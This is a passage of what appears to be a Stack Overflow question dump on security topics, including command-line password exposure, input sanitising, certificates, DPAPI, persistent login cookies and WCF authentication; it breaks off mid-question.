possible to see the arguments being passed to this program:</p>\n\n<pre><code>using System;\nusing System.Reflection;\nusing System.Diagnostics;\n\nclass Program\n{\n    static string password = \"\";\n\n    static void Main(string[] args)\n    {\n        if (args.Length &gt; 0)\n            password = args[0];\n\n        // get location where this program resides \n        var locationOfThisExe = Assembly.GetExecutingAssembly().Location;\n\n\n        Console.Write(\"Press enter to start a new instance of this program.\");\n        Console.Read();\n\n        var randomArgument = new Random().NextDouble().ToString();\n        Process.Start(locationOfThisExe, randomArgument); \n        // I am passing a random argument to a new process!\n        // is it possible to see these arguments from another process?\n    }\n}\n</code></pre>\n\n<hr>\n\n<h2>Edit</h2>\n\n<p><strong>I am creating an edit cause I think I explained my self incorrectly but this edit should be a solution instead of a question</strong></p>\n\n<p>I think this question has not received enough attention. Executing the command showed by <a href=\"http://stackoverflow.com/users/235660/alois-kraus\">http://stackoverflow.com/users/235660/alois-kraus</a>  shows:</p>\n\n<p>(I pasted the output on notepad++)</p>\n\n<p><img src=\"http://i.stack.imgur.com/TAdH2.png\" alt=\"enter image description here\"></p>\n\n<p>on the image it does not show very clearly but I was able to see the argument being pass to that process. <strong>That matters a lot to me because I mount my true crypt volumes with the command:</strong></p>\n\n<p>\"C:\\Program Files\\TrueCrypt\\TrueCrypt.exe\" /v \"a:\\volume.tc\" /lz /a /p a</p>\n\n<p>that tells to truecrypt that I want to mount the volume located at <code>a:\\volume.tc</code> on drive letter z  and the password is <code>a</code></p>\n\n<p>If I execute that command true crypt will mount that volume on drive z:</p>\n\n<p><img src=\"http://i.stack.imgur.com/pDY9h.png\" alt=\"enter image description here\"></p>\n\n<p>the problem is that If I then execute the command <code>wmic process</code> note what shoes up:</p>\n\n<p><img src=\"http://i.stack.imgur.com/vkGM1.png\" alt=\"enter image description here\"></p>\n\n<p><strong>Note the password is in there!</strong></p>\n\n<p>So in summary it is not safe to pass secure information as an argument. It may be secure if you close the process that received the arguments but I think it is important to be aware of this...</p>\n"},{"tags":["java","security","root"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":737,"score":3,"question_id":5271731,"title":"Running a part of a Java Program as Root","body":"<p>All,</p>\n\n<p>I want to run a part of my Java program as root. Only one particular function as root. The other part of the programs should run with the user privileges with which the program was started. I want to run only the below code as root and the other as it is. This is because I see different behavior for this code when it runs with ROOT privileges.</p>\n\n<pre><code> try\n    {\n         addr = Inet6Address.getByName(host);\n         isReachable = addr.isReachable(20*1000);\n    } catch (UnknownHostException e)\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":13279578,"title":"Confused on htmlspecialchars, real_escape_string, etc","body":"<p>I've written a decent admin interface that includes inventory management, content management, and blogging. Now its time to lock it down and make it secure (Yes, I should have been doing it from the beginning...</p>\n\n<p>For blog creation/editing, I'm using ckeditor which posts HTML output to editblog.php. Also i'm using simple text inputs for Title, Author, etc...</p>\n\n<p>I'm concerned because the blog will have img src=\"uploads/etc.jpg\", as well as divs, spans, etc...</p>\n\n<p>SO! When I sanitize this data, how do I make sure that all those quotes and slashes can be safely shoved into my SQL database, and what do i do to spit it back out on the frontend? I'm also concerned because if the blogger \"quotes\" something, I don't want that to be messed with either.</p>\n\n<p>Simple input like title, author, etc I'm using $title = mysqli_real_escape_string($title)\nBut is that enough? How do I preserve the user's intended input while avoiding attack?</p>\n\n<p>I've done my research and yet I still don't get it. I hope someone can break it down nice and simple for me...</p>\n"},{"tags":["security","https","passwords","fiddler","httpfox"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13280249,"title":"Why httpfox can capture google account clear password in HTTPS?","body":"<p>I have installed <a href=\"https://addons.mozilla.org/en-US/firefox/addon/httpfox/?src=search\" rel=\"nofollow\">httpfox</a> on firefox. and I tried to capture traffic on Google Account login page, I typed a wrong password for my test, and, to my surprise, It captured clear password in https pages.</p>\n\n<p>But I tried <a href=\"http://www.fiddler2.com/fiddler2/\" rel=\"nofollow\">fiddler</a> on Firefox/IE, no clear data was captured.</p>\n\n<p>I heard that HTTPS headers are also encrypted. but why they still get captured in httpfox? Is it possible for a hacker to do the same thing over the network?</p>\n\n<p><img src=\"http://i.stack.imgur.com/EAlXS.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","security","environment"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":13279689,"title":"Is it unsafe to switch environments based on domain?","body":"<p>I am curious if doing something like setting your \"environment\" to Production, Dev, Staging, etc. based on a domain name such as dev.domain.com, staging.domain.com is a bad idea.</p>\n\n<p>Can somebody just edit their hosts file to point dev.domain.com to domain.com so now the system <em>thinks</em> it's in Dev when it really is in Prod? This would mean any Dev specific code will be ran by a complete stranger.</p>\n\n<p>Is this possible or is there a better way to determine your environment such as setting it manually in a server variable?</p>\n\n<p>For reference, I am using PHP.</p>\n"},{"tags":["javascript","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13277429,"title":"Can a whitespace regex character be used to perform a javascript injection?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13276474/can-a-regex-whitespace-character-cause-an-injection\">can a regex whitespace character cause an injection?</a>  </p>\n</blockquote>\n\n\n\n<p>if I want to validate the input of a <code>&lt;textarea&gt;</code>, and want it to contain, for example, only numerical values, but even want to give users the possibility to insert new lines, I can selected wanted characters with a javascript regex that includes even the whitespace characters. </p>\n\n<pre><code>/[0-9\\s]/\n</code></pre>\n\n<p>The question is: do a whitecharacter can be used to perform injections, XSS,even if I think this last option is impossible, or any other type of attack ? </p>\n\n<p>thanks</p>\n\n<p><strong>update</strong></p>\n\n<p>yes I'm sorry for the duplicate, the question has been moved from webdesigners site, it wasn't my intention to ask twice the same thing on the same site.</p>\n"},{"tags":["sql-server-2005","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4914,"score":0,"question_id":733744,"title":"SQL server Error 4060","body":"<p>4060 \"Server rejected the connection; Access to selected database has been denied\".</p>\n\n<p>How can I troubleshoot this error?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13276225,"title":"Can I restrict website access to specific computers?","body":"<p>I realize that mac addresses or machine ids aren't transferred over the internet, however, I would like to lock down our subscription-based website security so that only specific computers can register and have access to its resources.</p>\n\n<p>Large organizations will subscribe to our service and will undoubtedly have more than one ip for their organization.  As well, we'd like to give the ability for their qualified employees to access the website on devices outside of their physical organization (for road-trip presentations, etc.). </p>\n\n<p>Is there a sure-fire way to achieve this end (beyond the username/password assigned to each account)?  If not, what would be the most effective approach?</p>\n"},{"tags":["javascript","regex","security","injection"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13276474,"title":"can a regex whitespace character cause an injection?","body":"<p>if I want to validate the input of a <code>&lt;textarea&gt;</code>, and want it to contain, for example, only numerical values, but even want to give users the possibility to insert new lines, I can selected wanted characters with a javascript regex that includes even the whitespace characters. </p>\n\n<pre><code>/[0-9\\s]/\n</code></pre>\n\n<p>The question is: do a whitecharacter can be used to perform injections, XSS,even if I think this last option is impossible, or any other type of attack ? </p>\n\n<p>thanks</p>\n"},{"tags":["web-services","security","rest","soap"],"answer_count":12,"favorite_count":29,"up_vote_count":50,"down_vote_count":0,"view_count":33164,"score":50,"question_id":853620,"title":"Secure Web Services: REST over HTTPS vs SOAP + WS-Security. Which is better?","body":"<p>I'm not a security expert by any means, but I favor creating REST-style web services.  </p>\n\n<p>In creating a new service which needs to have the data it transmits secure.  We've entered a debate over which approach is more secure - REST with HTTPS or a SOAP WS with WS-Security.</p>\n\n<p>I am under the impression we could use HTTPS for all the web service calls and this approach would be secure.  The way I look at it is, \"if HTTPS is good enough for bank and financial web sites, it's good enough for me\".  Again, I'm not expert in this space, but I'd think that these people have thought considerably hard about this problem and are comfortable with HTTPS.</p>\n\n<p>A coworker disagrees and says SOAP and WS-Security is the only way to go.</p>\n\n<p>The web seems all over the board on this.</p>\n\n<p>Maybe the community here could weigh in on the pros and cons of each?  Thanks!</p>\n"},{"tags":["php","forms","security","post"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13274305,"title":"Bare minimum to secure a PHP form","body":"<p>There are a lot of 'secure PHP form' questions out there, but I wasn't able to find a simple definitive 'bare-minimum needed' answer.</p>\n\n<p>How would I go about making a form 100% safe? Is it as simple as running a function on the output like so:</p>\n\n<pre><code>$text = $_POST['text'];\n$text = doThisToMakeSafe($text);\n</code></pre>\n\n<p>or are there other ways someone can get malicious access via a form without submitting?</p>\n\n<p>Ideally, I'd like a snippet of code I can throw into all forms so that I never have to worry about any security issues. Is this possible?</p>\n"},{"tags":["php","database","security","query","hash"],"answer_count":7,"favorite_count":2,"up_vote_count":14,"down_vote_count":0,"view_count":3442,"score":14,"question_id":3665247,"title":"Fastest hash for non-cryptographic uses?","body":"<p>I'm essentially preparing phrases to be put into the database, they may be malformed so I want to store a short hash of them instead (I will be simply comparing if they exist or not, so hash is ideal).</p>\n\n<p>I assume MD5 is fairly slow on 100,000+ requests so I wanted to know what would be the best method to hash the phrases, maybe rolling out my own hash function or using <code>hash('md4', '...'</code> would be faster in the end?</p>\n\n<p>I know MySQL has MD5(), so that would complement a bit of speed on the query end, but maybe there's further a faster hashing function in MySQL I don't know about that would work with PHP..</p>\n"},{"tags":["security","x509","certificates","expiry"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13272843,"title":"Why is it OK for CA certificates to have long expiry times but not the certs they sign?","body":"<p>I was looking at the certificate behind <a href=\"https://www.google.co.uk/\" rel=\"nofollow\">https://www.google.co.uk/</a> earlier and noticed that, as is typical, the certificate was set to expire after a year, by 2013.</p>\n\n<p>I looked up the chain and notices that the root cert, a GeoTrust cert, has a 20 year lifetime and doesn't expire until 2018.</p>\n\n<p>It seems odd as the integrity of signing certificates seem to me more important than the certificates they sign. Why is it OK for root authorities to live for a long time but the certificates they sign tend to have much shorted expiry times?</p>\n"},{"tags":["security","signature","malware-detection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13152150,"title":"Signature scanning","body":"<p>many antivirus programs using signature-based malware detection. Here is <a href=\"http://www.clamav.net/doc/webinars/Webinar-Alain-2009-03-04.pdf\" rel=\"nofollow\">creating signatures for ClamAV</a>. I can understand how they create signatures considering that the whole file is a malware, but I couldn't understand how to find malware when it is in the body of the file - the hash would be another. Anybody knows?</p>\n"},{"tags":["java","security","java-ee","websphere"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13271231,"title":"Filter executed before j_security_check","body":"<p>I have a filter mapped to /* and my security constraint is mapped to /*.</p>\n\n<p>The filter perfoms a request forward when the application is not configured (an entry in the database). </p>\n\n<p>When I access the application I am expecting to see the login page that is served up by the j_securit_check but instead the filter is executed and the forward is performed. This ends in a loop as I never get to the login page.</p>\n\n<p>I thought security checks were performed <em>before</em> filters were processed?</p>\n\n<p>This is WebSphere 8.0.0.4. It functions fine under Tomcat and JBoss. </p>\n\n<p>Thanks for reading.</p>\n"},{"tags":["wcf","security","authorization"],"answer_count":6,"favorite_count":3,"up_vote_count":25,"down_vote_count":0,"view_count":39469,"score":25,"question_id":1026855,"title":"WCF - Windows authentication - Security settings require Anonymous","body":"<p>I am struggling hard with getting WCF service running on IIS on our server. After deployment I end up with an error message:</p>\n\n<p><em>Security settings for this service require 'Anonymous' Authentication but it is not enabled for the IIS application that hosts this service.</em> </p>\n\n<p>I want to use Windows authentication and thus I have Anonymous access disabled. Also note that there is aspNetCompatibilityEnabled (if that makes any difference).</p>\n\n<p>Here's my web.config:</p>\n\n<pre><code>&lt;system.serviceModel&gt;\n\t&lt;serviceHostingEnvironment aspNetCompatibilityEnabled=\"true\" /&gt;\n\t&lt;bindings&gt;\n\t\t&lt;webHttpBinding&gt;\n\t\t\t&lt;binding name=\"default\"&gt;\n\t\t\t\t&lt;security mode=\"TransportCredentialOnly\"&gt;\n\t\t\t\t\t&lt;transport clientCredentialType=\"Windows\" proxyCredentialType=\"Windows\"/&gt;\n\t\t\t\t&lt;/security&gt;\n\t\t\t&lt;/binding&gt;\n\t\t&lt;/webHttpBinding&gt;\n\t&lt;/bindings&gt;\n\t&lt;behaviors&gt;\n\t\t&lt;endpointBehaviors&gt;\n\t\t\t&lt;behavior name=\"AspNetAjaxBehavior\"&gt;\n\t\t\t\t&lt;enableWebScript /&gt;\n\t\t\t\t&lt;webHttp /&gt;\n\t\t\t&lt;/behavior&gt;\n\t\t&lt;/endpointBehaviors&gt;\n\t\t&lt;serviceBehaviors&gt;\n\t\t\t&lt;behavior name=\"defaultServiceBehavior\"&gt;\n\t\t\t\t&lt;serviceMetadata httpGetEnabled=\"true\" httpsGetEnabled=\"false\" /&gt;\n\t\t\t\t&lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n\t\t\t\t&lt;serviceAuthorization principalPermissionMode=\"UseWindowsGroups\" /&gt;\n\t\t\t&lt;/behavior&gt;\n\t\t&lt;/serviceBehaviors&gt;\n\t&lt;/behaviors&gt;\n\t&lt;services&gt;\n\t\t&lt;service name=\"xxx.Web.Services.RequestService\" behaviorConfiguration=\"defaultServiceBehavior\"&gt;\n\t\t\t&lt;endpoint behaviorConfiguration=\"AspNetAjaxBehavior\" binding=\"webHttpBinding\"\n\t\t\t contract=\"xxx.Web.Services.IRequestService\" bindingConfiguration=\"default\"&gt;\n\t\t\t&lt;/endpoint&gt;\n\t\t\t&lt;endpoint address=\"mex\" binding=\"mexHttpBinding\" name=\"mex\" contract=\"IMetadataExchange\"&gt;&lt;/endpoint&gt;\n\t\t&lt;/service&gt;\n\t&lt;/services&gt;\n&lt;/system.serviceModel&gt;\n</code></pre>\n\n<p>I have searched all over the internet with no luck. Any clues are greatly appreciated.</p>\n"},{"tags":["java","security","applet","digital-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13271372,"title":"Digital Certificate not loaded in browser on windows System","body":"<p>When I run applet and initialize browser key store I get this error:</p>\n\n<pre><code>java.security.AccessControlException: access denied (\"java.security.SecurityPermission\" \"authProvider.SunMSCAPI\")\n</code></pre>\n\n<p>To resolve this error I have added first two lines:</p>\n\n<pre><code>Provider mscapi = Security.getProvider(\"SunMSCAPI\");\nSecurity.addProvider(mscapi);\n\nkeyStore = KeyStore.getInstance(\"Windows-MY\");\nkeyStore.load(null, null);\n\nreturn keyStore;\n</code></pre>\n\n<p>But still it is not working it will give error access denied for inserting <code>SunMSCAPI</code> provider.</p>\n"},{"tags":["security","powershell","powershell-v2.0","powershell-remoting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13271394,"title":"Error Unknown security using Remote PSSession CredSSP","body":"<p>I have Windows 7 64 bits, and Powershell 2.0, and CredSSP enabled in client</p>\n\n<pre><code>Enable-WSManCredSSP -Role Client -DelegateComputer * -Force\n</code></pre>\n\n<p>I open Powershell Console, and I execute Enter-PSSession command to connect Windows 2008 Server using CredSSP authentication:</p>\n\n<pre><code>Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\\installerUser\n</code></pre>\n\n<p>I want execute Get-WSManCredSSP command remotely, but I get error: \"... while using Negotiate authentication: An unknown security error occurred.\"</p>\n\n<pre><code>PS C:\\Users\\myUser&gt; Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\\installerUser\n\n[ServerMOSS]: PS C:\\Users\\installerUser\\Documents&gt; Get-WSManCredSSP\n\nWinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security\n error occurred.\n Possible causes are:\n  -The user name or password specified are invalid.\n  -Kerberos is used when no authentication method and no user name are specified.\n  -Kerberos accepts domain user names, but not local user names.\n  -The Service Principal Name (SPN) for the remote computer name and port does not exist.\n  -The client and remote computers are in different domains and there is no trust between the two domains.\n After checking for the above issues, try the following:\n  -Check the Event Viewer for events related to authentication.\n  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or us\ne HTTPS transport.\n Note that computers in the TrustedHosts list might not be authenticated.\n   -For more information about WinRM configuration, run the following command: winrm help config.\n    + CategoryInfo          :\n    + FullyQualifiedErrorId : WsManError,Microsoft.WSMan.Management.GetWSManCredSSPCommand\n\n[ServerMOSS]: PS C:\\Users\\installerUser\\Documents&gt; Exit-PSSession\n</code></pre>\n\n<p>IT departament execute this command in ServerMOSS:</p>\n\n<pre><code>PS C:\\Users\\installerUser\\Documents&gt; enabled-psremoting -force\n</code></pre>\n\n<p>and they get error:</p>\n\n<pre><code>WinRM already is set upt to receive requests on this machine\nSet-WSManQuickConfig: WinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security error ocurred.\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["sql-server","sql-server-2005","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1321,"score":2,"question_id":5166641,"title":"SQL Server Foreign Keys across database boundaries - techniques for enforcement","body":"<p>I have two separate SQL Server 2005 databases (on the same server) </p>\n\n<ul>\n<li>security database  </li>\n<li><p>main application database</p></li>\n<li><p>The security database has a  <strong>user table</strong> with everything needed to authenticate.  - </p></li>\n<li>The application database has a <strong>person table</strong> with extended user details. There is a 1-1 mapping between the security database user table and the application database person table.</li>\n</ul>\n\n<p>I want to enforce a mapping between the user and the person table. I'm assuming that foreign keys can't be mapped across databases thus I am wondering what to do to enforce the integrity of the relationship.</p>\n"},{"tags":["security","hash","sha"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13269606,"title":"Signature/Hash Choice for File Integrity Verification","body":"<p>For a file repository, I need to select a hashing algorithm that will reasonably ensure the integrity of files. </p>\n\n<p>I need an algorithm that anyone (with a bit of effort) would be able to easily use to verify the integrity given the hash. In short, the file may be transferred to the user, along with a hash, and they must be able to verify that the hash comes from the file. </p>\n\n<p>My first choice would be MD5 because there seems to be widely available utilities to verify MD5 hashes, but I'm concerned with the MD5 algorithm being cryptographically broken (ref Wikipedia/US-CERT: <a href=\"http://en.wikipedia.org/wiki/MD5\" rel=\"nofollow\">http://en.wikipedia.org/wiki/MD5</a>)</p>\n\n<p>My second choice would be a SHA-2 algorithm, but I'm concerned about availability of utilities that could easily verify the hash. Most examples I've found show program code to evaluate a hash, but I've found few, if any, utilities that are pre-built (asking users to build their own utility is beyond the 'easily' scope)</p>\n\n<p>What other options are available for generating and evaluating a file hash, or are these two the options that are best?</p>\n"},{"tags":["c#","c++","security","windows-services","certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13269574,"title":"Error : \"Impossible to find object or property\", when loading a private certificate in a Windows service running as LocalSystem","body":"<p>I am developing a Windows service middleware that uses security certificates to perform authentication when it wants to initialize a secure communication channel with remote applications.</p>\n\n<p>The Windows service is a .Net 3.5  application that uses (via a C++/CLI layer) the C++ WinCrypt library in order to load certificates. In particular I am calling the CertFindCertificateInStore method when i accessing the store to load the certificate. The CertFindCertificateInStore uses the My system store as store by default.</p>\n\n<p>I have registered my private certificate in the My system store either for the current user (the user logged onto the machine) either for the local machine, via the MMC console. Be sure that the certificate is good and it includes my private key.</p>\n\n<p>When i run the Windows service as current user (again the user logged onto the machine)  the certificate is correctly loaded,  instead the certificate is not loaded when i run the service as LocalSystem. The error  \"Impossible to find object or property\", is then raised when I call the CertFindCertificateInStore. I point up that the My store instead continues to be accessible.</p>\n\n<p>(NB: When I open a new session using a different user and I run the same Windows service as user for whom I registered the certificates, the certificate is again correctly loaded)</p>\n\n<p>Then I used either the MMC console either the winhttpcertcfg.exe system tool in order to verify that the LocalSystem user has the rights to access my certificate. Afterwards either the MMC console and the winhttpcertcfg.exe tool confirm that THEORETICALLY the user LocalSystem has the rights to access the certificate.</p>\n\n<p>Do you have any suggestion to help me to solve this problem?</p>\n\n<p>Thank you in advance for your help,</p>\n\n<p>PS: a similar question has been posted here <a href=\"http://stackoverflow.com/questions/3936065/certificates-cannot-find-the-certificate-and-private-key-for-decryption-error-w\">Certificates: Cannot find the certificate and private key for decryption Error when sign</a></p>\n"},{"tags":[".net","security"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":852,"score":7,"question_id":1326001,"title":"Windows DPAPI - what to do with entropy?","body":"<p>I'm using the Windows DPAPI to encrypt some sensitive data for me. The cipher is stored in the registry. This all works well, but I was wondering if someone could clarify my understanding of the 'entropy' bytes that are (optionally) supplied to ProtectedData.Protect() in .NET.</p>\n\n<p>The 'entropy' byte array appears to be analogous to an initialization vector or salt used with other cryptography schemes, but I could not see a good description of the entropy bytes in MSDN. The code samples I've seen just hard code in the entropy bytes!</p>\n\n<p>Are the entropy bytes supplied to ProtectedData.Protect() &amp; ProtectedData.Unprotect analogous to an IV or salt? Can the entropy bytes therefore be stored safely alongside the cipher, or would that compromise security?</p>\n"},{"tags":["c++","security","winapi","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13268625,"title":"Security Attributes when creating folder","body":"<p>I have the following line of code:</p>\n\n<pre><code>CreateDirectory(full_folder, attr);\n</code></pre>\n\n<p>Now the attr variable is of type LPSECURITY_ATRRIBUTES and is currently set to NULL.  Can anyone please provide me with a list of all the keywords that are accepted by this variable.  I have searched over the internet but I can't seem to find a proper list.  Maybe I am not searching correctly.</p>\n\n<p>Thanks :)</p>\n"},{"tags":["java","security","usb-flash-drive","flash-drives"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":42,"score":-1,"question_id":13266473,"title":"USB should block after detection using Java","body":"<p>How can I built a program in Java which block the USB port and when a USB device get attached to it, then the system ask for password (on behalf of my program/service)?</p>\n\n<p>I found some API's for USB security like jUSB, JSR-80. Are they capable to provide this functionality?</p>\n\n<p>I also want to know that how can I secure it as machine/system specific and how can I provide encryption on data level?</p>\n"},{"tags":["web-services","security","web-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13265301,"title":"what are the available security options when building web services","body":"<p>I am building a web service JSON APIs  for my asp.net MVC web application, currently i performing the following security mechanisms:-</p>\n\n<ol>\n<li>I have defined a master username and password on my web site for each client that will consume any of the web service .</li>\n<li>when any consumer register to use the webs service i send them the master login username and a hash  value representing the password.</li>\n<li>on each web service request i will check if the username and password are valid.</li>\n</ol>\n\n<p>I think that the approach i am following is to a certain level secure, but i am facing the following problems:-</p>\n\n<ol>\n<li><p>The clients will not be able to call any of these web services using JavaScript on the client browser, since on this way they will be exposing the master login username and password , so any web service request should be done on the server and send back to the client. let say the client has an asp.net mvc web application , then all web services requests should be done of the controller or on the module level, and they will not be able to write a javascript which directly call the web services .</p></li>\n<li><p>Is my approach secure? and what other security mechanism i can follow which can be more secure and reliable?</p></li>\n</ol>\n\n<p>Thanks&amp; Best Regards</p>\n"},{"tags":["html","security","same-origin-policy"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3707,"score":2,"question_id":1131210,"title":"Work around for the same origin policy problem","body":"<p>I have a problem where I have a frameset consisting of a parent frame loaded from one domain and a contained frame from a different domain. The contained domain also sets a cookie before the frameset is loaded. However, because of the 'same orgin' policy, enforced by most browsers, a contained frame will not pass cookies if it is not from the same domain as the parent.</p>\n\n<p>Unfortunately I have no control over the parent frame (or its url) and the url for the contained frame is effectively static. So the only way to pass information to the contained site is via cookies.</p>\n\n<p>The only solution I have come up with is to reload the contained domain in the parent frame but this negates some of the value of using frames in the first place.</p>\n\n<p>Does anyone have a better work around for this problem?</p>\n"},{"tags":["linux","apache","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13252172,"title":"Redirect rule for only home page from http to https","body":"<p>Can we make https for only home page i.e., for </p>\n\n<blockquote>\n  <p>example.com <strong>or</strong> <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> <strong>or</strong> www.example.com <strong>or</strong> <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a></p>\n</blockquote>\n\n<p>remaining all pages should start with http.</p>\n\n<p>I have tried like this but it isn't worked</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} \"^/$\"\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} ^(.*)$\nRewriteRule ^(.*) http://%{HTTP_HOST}%{REQUEST_URI}\n</code></pre>\n"},{"tags":["security","cookies","login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12989778,"title":"Any gotchas I should be aware of regarding this approach to persistent logins (\"Remember Me\")?","body":"<p>This web application will have a database table with columns uniqueid (64-bit int autoincrement field; key), token (64-byte binary field), and an accountid.</p>\n\n<p>After logging in with \"Remember Me\" checked, a random token will be generated. Then the SHA-512 hash of this token will be inserted into the database and the generated uniqueid retrieved. A cookie that contains the uniqueid and unhashed token is sent to the client.</p>\n\n<p>Every time a user visits the page with the cookie, the cookie's uniqueid and its token's SHA-512 hash with be checked against the database. If there is a row that matches the uniqueid, and that row's token hash matches the token hash, log in the user with the row's accountid. After every authentication attempt made by the cookie, delete the row that uses the old uniqueid and, if the authentication was successful, generate a new random token. Then the SHA-512 hash of this token will be inserted into the database and the generated uniqueid retrieved. A cookie that contains the uniqueid and unhashed token is sent to the successfully authenticated client.</p>\n\n<p>I will be using the techniques described <a href=\"http://blog.teamtreehouse.com/how-to-create-totally-secure-cookies\" rel=\"nofollow\">here</a> as well. All failed cookie authentications will have the cookies set to blank values and expiration date set to sometime in the past.</p>\n\n<p>I believe this method would address a few concerns regarding cookies. Namely:</p>\n\n<ol>\n<li><p>The token in the database is hashed so that as long as an attacker does not have write access to the database, he/she will not be able to forge cookies of\nall users.</p></li>\n<li><p>Unique IDs are used instead of a user's account name because login\ncredentials should never be stored in a cookie.</p></li>\n<li><p>A random token is generated every time the cookie is authenticated\nso that if an attacker steals a cookie, it will only be valid until\nthe user next logs in rather than for the entire time the user is\nremembered.</p></li>\n<li><p>Cookies will be difficult to sniff because my entire application uses HTTPS.</p></li>\n</ol>\n\n<p>I can further enhance security by allowing the user to specify how long he/she wants to be remembered for. The expiration date will be stored in the same database table that stores uniqueid and tokens. Every time a new cookie is created, this expiration will be sent with the cookie. If a user tries logging in with a cookie that the server deems expired but the client still holds, the log in will be denied.</p>\n\n<p>I believe this solution is reasonably secure, but are there any pitfalls or things that I have overlooked when I designed this method?</p>\n\n<p>Sources:</p>\n\n<p><a href=\"http://stackoverflow.com/a/8508213/444402\">Hash token in database</a></p>\n\n<p><a href=\"http://stackoverflow.com/a/7591897/444402\">Don't store account name in cookies and use new unique id after every authentication</a></p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13262185,"title":"MD5 the id in URL and get the id to other page using PHP","body":"<p>Suppose that I have code as below:</p>\n\n<pre><code>&lt;td&gt;&lt;a href=\"view_edit_form.php?id=&lt;?php echo md5($row[0]);?&gt;\"&gt;Edit&lt;/a&gt;&lt;/td&gt;\n</code></pre>\n\n<p>And in page <code>view_edit_form.php</code> I get the id by using this code <code>$ID = $_GET['id'];</code></p>\n\n<p><strong>The problem</strong></p>\n\n<p>I can not get the <code>id</code> if I <code>md5</code> it like this.Anyone help me please, Thanks.</p>\n"},{"tags":["linux","security","ubuntu","kernel","kill"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13261277,"title":"Secure method for killing a process and all offspring","body":"<p>I am creating a sandbox environment in Linux using <a href=\"http://manpages.ubuntu.com/manpages/precise/man2/aa_change_profile.2.html\" rel=\"nofollow\">apparmor</a>, <a href=\"http://manpages.ubuntu.com/manpages/precise/man2/setrlimit.2.html\" rel=\"nofollow\">setrlimit</a>, <a href=\"http://manpages.ubuntu.com/manpages/precise/man3/cap_set_proc.3.html\" rel=\"nofollow\">cap_set_rpoc</a> to let anonymous users basically execute some arbitrary code on my server in the context of a scientific application. One thing that is specifically allowed in the sandbox is starting new processes by forking and calling executables (although the total number of processes by one user is limited by <code>RLIMIT_NPROC</code>).</p>\n\n<p>After a given time period, say 1 minute, the system will kill the main process, and all of the potential children. I am currently relying on the process group id to identify children. However, in theory, a child process could call <code>setpgid</code> to change its process group, so that it will no longer be affected when I call <code>kill(-1 * pid)</code> on the main process id (correct?). Unfortunately, there is no linux <code>capability</code> that I can set to prevent processes from calling <code>setpgid</code>.</p>\n\n<p>What would be a robust way of killing a process and all of its (recursive) children, which would make it very hard for the children to somehow \"escape\" the massacre and continue as orphan processes?</p>\n"},{"tags":["java","python","security","encryption","aes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13262047,"title":"AES Encryption (Python and Java)","body":"<p>I'm making a project in Java and Python that includes sending an encrypted string from one to the other. I can get the languages to understand each other and fully de-crypt / encrypt strings. However I was talking to somebody and was told that I am not being totally secure. I am using AES encryption for the project. Part 